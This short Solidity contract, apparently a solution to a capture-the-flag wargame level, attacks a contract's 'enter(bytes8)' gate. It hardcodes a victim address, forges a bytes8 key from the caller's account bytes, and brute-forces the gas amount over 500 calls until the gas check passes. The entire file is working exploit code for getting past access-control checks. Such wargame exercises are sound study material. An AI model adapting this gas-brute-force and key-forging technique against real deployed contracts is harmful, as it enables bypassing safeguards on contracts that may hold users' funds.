// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    // Use your victim's contract address
    address victim = 0x8666FDA2b7366a374Aa2F0D42197c14a114D2bCc;
    uint public value;
    
    function attack() external{
        bool status = false;
        // Get the last two bytes of your account
        // For instance: 0x9156b5Bf1789F6d977296ce02A10eaE5330Bb5eF
        bytes8 data = 0x100000000000B5EF;
        for(uint i = 0; i< 500; i++){
            (status, ) = victim.call{gas: 8191 * 10 + i}(abi.encodeWithSignature("enter(bytes8)",data));
           if(status)
                value = i;
        }   
    }  

}